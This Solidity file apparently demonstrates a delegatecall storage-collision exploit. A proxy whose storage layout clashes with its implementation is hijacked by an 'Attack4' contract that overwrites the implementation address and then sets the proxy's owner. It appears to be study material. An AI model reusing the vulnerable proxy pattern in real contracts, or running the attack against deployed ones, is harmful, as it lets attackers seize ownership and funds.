// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "hardhat/console.sol";

contract Implementation {
    uint public number;

    function updateNumber(uint _number) public   {
        number = _number;
    }

}

contract Proxy1 {
    address public implementation;
    address public owner;
    uint public number;

    constructor(address _implementaiton) {
        implementation = _implementaiton;
        owner = msg.sender;
    }

    function updateNumber(uint _number) public{
        implementation.delegatecall(abi.encodeWithSignature("updateNumber(uint256)", _number));
    }
}

contract Attack4 {
    address public implementation;
    address public owner;
    uint public number;

    Proxy1 public proxy;
    
    constructor(Proxy1 _proxy) {
        proxy = Proxy1(_proxy);
    }

    function attack() public {
        proxy.updateNumber(uint(uint160(address(this))));
        proxy.updateNumber(100);
    }

    function updateNumber(uint _number) public {
        owner = msg.sender;
        number = _number;
    }
}